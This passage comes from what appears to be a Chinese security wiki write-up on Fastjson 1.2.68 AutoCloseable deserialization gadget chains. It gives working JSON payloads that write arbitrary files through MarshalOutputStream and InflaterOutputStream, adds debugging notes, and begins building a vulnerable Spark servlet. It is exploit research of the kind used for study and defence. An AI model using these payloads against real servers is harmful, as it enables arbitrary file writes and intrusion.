        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>dst<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PrivateCopy</span><span class="token punctuation">(</span>iis<span class="token punctuation">,</span> fos<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  <span class="token comment">/* end of InflateFile */</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token comment">// 压缩：&quot;D:\Tmp\test.txt&quot; &quot;D:\Tmp\testDeflate.txt&quot; 0</span>
        <span class="token comment">// 解压：&quot;D:\Tmp\testDeflate.txt&quot; &quot;D:\Tmp\testInflate.txt&quot; 1</span>
        <span class="token class-name">String</span> src <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> dst <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> mode <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">switch</span> <span class="token punctuation">(</span>mode<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 压缩</span>
            <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
                <span class="token class-name">DeflateFile</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token comment">// 解压</span>
            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
                <span class="token class-name">InflateFile</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428135602-lxmq0oy.43fd33de.png" alt="image" loading="lazy">​</p><p><a href="http://scz.617.cn:8/web/202008111505.txt" target="_blank" rel="noopener noreferrer">http://scz.617.cn:8/web/202008111505.txt<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>$ xxd <span class="token parameter variable">-g</span> <span class="token number">1</span> src
0000000: <span class="token number">73</span> <span class="token number">63</span> 7a <span class="token number">20</span> <span class="token number">69</span> <span class="token number">73</span> <span class="token number">20</span> <span class="token number">68</span> <span class="token number">65</span> <span class="token number">72</span> <span class="token number">65</span>                 scz is here
压缩:
$ <span class="token function">java</span> DeflateTest src dst <span class="token number">0</span>
$ <span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span> <span class="token string">&#39;scz is here&#39;</span> <span class="token operator">|</span> python2 <span class="token parameter variable">-c</span> <span class="token string">&#39;import sys,zlib;sys.stdout.write(zlib.compress(sys.stdin.read(),9))&#39;</span> <span class="token operator">&gt;</span> dst
$ <span class="token function">cat</span> src <span class="token operator">|</span> python2 <span class="token parameter variable">-c</span> <span class="token string">&#39;import sys,zlib;sys.stdout.write(zlib.compress(sys.stdin.read(),9))&#39;</span> <span class="token operator">&gt;</span> dst
$ xxd <span class="token parameter variable">-g</span> <span class="token number">1</span> dst
0000000: <span class="token number">78</span> da 2b 4e ae <span class="token number">52</span> c8 2c <span class="token number">56</span> c8 <span class="token number">48</span> 2d 4a 05 00 <span class="token number">18</span>  x.+N.R.,V.H-J<span class="token punctuation">..</span>.
0000010: 6d 04 <span class="token number">11</span>                                         m<span class="token punctuation">..</span>

解压:
$ <span class="token function">java</span> DeflateTest dst src <span class="token number">1</span>
$ <span class="token function">cat</span> dst <span class="token operator">|</span> python2 <span class="token parameter variable">-c</span> <span class="token string">&#39;import sys,zlib;sys.stdout.write(zlib.decompress(sys.stdin.read()))&#39;</span> <span class="token operator">&gt;</span> src
$ openssl zlib <span class="token parameter variable">-d</span> <span class="token operator">&lt;</span> dst <span class="token operator">&gt;</span> src
$ <span class="token builtin class-name">printf</span> <span class="token string">&quot;<span class="token entity" title="\x1f">\x1f</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span>&quot;</span> <span class="token operator">|</span> <span class="token function">cat</span> - dst <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token parameter variable">-dc</span> <span class="token operator">&gt;</span> src
gzip: stdin: unexpected end of <span class="token function">file</span>
有个警告，但解压无误。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="调试分析" tabindex="-1"><a class="header-anchor" href="#调试分析"><span>调试分析</span></a></h4><p><strong>【PoC】</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    &#39;@type&#39;<span class="token operator">:</span><span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    &#39;@type&#39;<span class="token operator">:</span>&#39;sun.rmi.server.MarshalOutputStream&#39;<span class="token punctuation">,</span>
    &#39;out&#39;<span class="token operator">:</span>
    <span class="token punctuation">{</span>
        &#39;@type&#39;<span class="token operator">:</span>&#39;java.util.zip.InflaterOutputStream&#39;<span class="token punctuation">,</span>
        &#39;out&#39;<span class="token operator">:</span>
        <span class="token punctuation">{</span>
           &#39;@type&#39;<span class="token operator">:</span>&#39;java.io.FileOutputStream&#39;<span class="token punctuation">,</span>
           &#39;file&#39;<span class="token operator">:</span>&#39;d<span class="token operator">:</span>/tmp/fj_hack_jdk11&#39;<span class="token punctuation">,</span>
           &#39;append&#39;<span class="token operator">:</span><span class="token boolean">false</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        &#39;infl&#39;<span class="token operator">:</span>
        <span class="token punctuation">{</span>
            &#39;input&#39;<span class="token operator">:</span>
            <span class="token punctuation">{</span>
                &#39;array&#39;<span class="token operator">:</span>&#39;eNorSS0uUUiqVMjNT9LjAgAhzgRS&#39;<span class="token punctuation">,</span>
                &#39;limit&#39;<span class="token operator">:</span><span class="token number">21</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        &#39;bufLen&#39;<span class="token operator">:</span><span class="token number">100</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    &#39;protocolVersion&#39;<span class="token operator">:</span><span class="token number">1</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>若 <code>bufLen = 1048576</code>​，这意味着缓冲区大小为 1MB，根据实际情况设定。通常情况下，缓冲区大小越大，内存消耗越高，但是解压速度可能会更快。</p><hr><p><strong>调试</strong></p><ol><li>使用 <code>sun.rmi.server.MarshalOutputStream#MarshalOutputStream(java.io.OutputStream, int)</code>​ 这个构造方法, 进而调用到它父类的方法 <code>java.io.ObjectOutputStream#ObjectOutputStream()</code>​</li></ol><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428140759-vo35bbf.ad867b6b.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428142145-h2f7z8p.96fa4792.png" alt="image" loading="lazy">​</p><p>对应 poc</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code>&#39;@type&#39;<span class="token operator">:</span>&#39;sun.rmi.server.MarshalOutputStream&#39;<span class="token punctuation">,</span>
&#39;out&#39;<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
&#39;protocolVersion&#39;<span class="token operator">:</span><span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>接着解析嵌套的 <code>@type</code>​，调用到 <code>java.util.zip.InflaterOutputStream#InflaterOutputStream(java.io.OutputStream, java.util.zip.Inflater, int)</code>​ 这个构造方法，也会调用它父类的方法。</li></ol><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428142609-oe8f9kc.2d6d022c.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428150101-avrn0o4.da0f056d.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428152943-3nr5s9t.e1b6c234.png" alt="image" loading="lazy">​</p><p>对应 poc</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code>&#39;@type&#39;<span class="token operator">:</span>&#39;java.util.zip.InflaterOutputStream&#39;<span class="token punctuation">,</span>
&#39;out&#39;<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
&#39;infl&#39;<span class="token operator">:</span><span class="token punctuation">{</span>
    &#39;input&#39;<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
&#39;bufLen&#39;<span class="token operator">:</span><span class="token number">100</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>继续解析 <code>java.io.FileOutputStream#FileOutputStream(java.io.File, boolean)</code>​</li></ol><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428145135-f4izk1x.f40540b7.png" alt="image" loading="lazy">​</p><p>对应 poc</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code>&#39;@type&#39;<span class="token operator">:</span>&#39;java.io.FileOutputStream&#39;<span class="token punctuation">,</span>
&#39;file&#39;<span class="token operator">:</span>&#39;d<span class="token operator">:</span>/tmp/fj_hack_jdk11&#39;<span class="token punctuation">,</span>
&#39;append&#39;<span class="token operator">:</span><span class="token boolean">false</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="4"><li><p>在遇到 <code>Inflater#setInput(ByteBuffer input)</code>​ 方法时，fastjson 处理 <code>java.nio.ByteBuffer</code>​ 类型的反序列化会使用 <code>com.alibaba.fastjson.serializer.ByteBufferCodec</code>​ 这个反序列化器进行处理。</p><p>该反序列化器会将数据先反序列化为 <code>com.alibaba.fastjson.serializer.ByteBufferCodec$ByteBufferBean</code>​，然后再调用 <code>ByteBufferCodec$ByteBufferBean#byteBuffer()</code>​ 方法返回 <code>ByteBuffer</code>​ 对象。</p></li></ol><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428153153-sputxy2.ef2e2f6d.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428153239-k8eiltl.ba990201.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428153343-xip08v2.5881d220.png" alt="image" title="/fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/util/JavaBeanInfo.java:564" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428132555-p2ybthd.451a137c.png" alt="image" loading="lazy">​</p><h3 id="gadget-4-原生写文件-jdk8-10" tabindex="-1"><a class="header-anchor" href="#gadget-4-原生写文件-jdk8-10"><span>Gadget 4：原生写文件（JDK8/10）</span></a></h3><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&amp;mid=2247484413&amp;idx=1&amp;sn=1e6e6dc310896678a64807ee003c4965&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">寻找 Fastjson 1.2.68 AutoCloseable 利用链(3) (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&amp;mid=2247484408&amp;idx=1&amp;sn=fc7230f61a248945721def0f63bab431&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">寻找 Fastjson 1.2.68 AutoCloseable 利用链(2) (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>以 <span class="token number">8</span>u232 为例，<span class="token string">&quot;java.util.zip.Inflater&quot;</span> 没有名为 input 的成员，只有成员

<span class="token string">&quot;byte[] buf&quot;</span>，其对应的 setter 是<span class="token operator">:</span>

<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>zip<span class="token punctuation">.</span></span>Inflater</span><span class="token punctuation">.</span><span class="token function">setInput</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">void</span>

据此修改 <span class="token class-name">PoC</span>。
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">{</span>
    <span class="token char">&#39;@type&#39;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    <span class="token char">&#39;@type&#39;</span><span class="token operator">:</span> &#39;<span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span>MarshalOutputStream</span>&#39;<span class="token punctuation">,</span>
    <span class="token char">&#39;out&#39;</span><span class="token operator">:</span>
    <span class="token punctuation">{</span>
        <span class="token char">&#39;@type&#39;</span><span class="token operator">:</span> &#39;<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>zip<span class="token punctuation">.</span></span>InflaterOutputStream</span>&#39;<span class="token punctuation">,</span>
        <span class="token char">&#39;out&#39;</span><span class="token operator">:</span>
        <span class="token punctuation">{</span>
            <span class="token char">&#39;@type&#39;</span><span class="token operator">:</span> &#39;<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>FileOutputStream</span>&#39;<span class="token punctuation">,</span>
            <span class="token char">&#39;file&#39;</span><span class="token operator">:</span> <span class="token char">&#39;dst&#39;</span><span class="token punctuation">,</span>
            <span class="token char">&#39;append&#39;</span><span class="token operator">:</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token char">&#39;infl&#39;</span><span class="token operator">:</span>
        <span class="token punctuation">{</span>
            <span class="token char">&#39;input&#39;</span><span class="token operator">:</span> &#39;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw<span class="token operator">==</span>&#39;
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token char">&#39;bufLen&#39;</span><span class="token operator">:</span> <span class="token number">1048576</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    &#39;protocolVersion&#39;<span class="token operator">:</span> <span class="token number">1</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>MarshalOutputStream、InflaterOutputStream、FileOutputStream 用的都是有参构</p><p>造函数，全部面临 <code>ASMUtils.lookupParameterNames()</code>​ 的检查。</p><p>目标环境中的 jar 包或 modules 文件是否保留**<mark>调试信息</mark>**，只能 case by case 检查了。<a href="https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&amp;mid=2247484413&amp;idx=1&amp;sn=1e6e6dc310896678a64807ee003c4965&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">我的<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> RedHat 7.6 中的 8u232、Debian 9 中的 10.0.2、Windows 中的 11.0.5 都带调试信息，但 Windows 中的 8u221 就不带；或许 Linux 中的大部分都带，而 Windows 中 11 以前的都不带？这种猜测没啥意义，也就顺嘴一胡猜。</p></blockquote><p>而我的都没有，尴尬。。。</p><h3 id="gadget-5-写文件" tabindex="-1"><a class="header-anchor" href="#gadget-5-写文件"><span>Gadget 5：写文件</span></a></h3><ul><li><a href="http://scz.617.cn:8/web/202008081723.txt" target="_blank" rel="noopener noreferrer">寻找 Fastjson 1.2.68 AutoCloseable 利用链<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul><h2 id="fatjar-写文件实战" tabindex="-1"><a class="header-anchor" href="#fatjar-写文件实战"><span>Fatjar 写文件实战</span></a></h2><ul><li>需要找到懒加载的 jar 包进行定制替换</li><li>原生写入链的话需要 JDK 版本带有调试信息 <code>LocalVariableTable</code>​</li></ul><h3 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建"><span>环境搭建</span></a></h3><p><strong>【添加依赖】</strong></p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.68<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.sparkjava<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spark-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.5.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>slf4j-simple<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.7.21<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【Servlet】</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">webdemo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">spark<span class="token punctuation">.</span></span><span class="token class-name">Spark</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">spark<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">SparkApplication</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Index</span> <span class="token keyword">implements</span> <span class="token class-name">SparkApplication</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">Index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Spark</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">&quot;Hello World&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Spark</span><span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
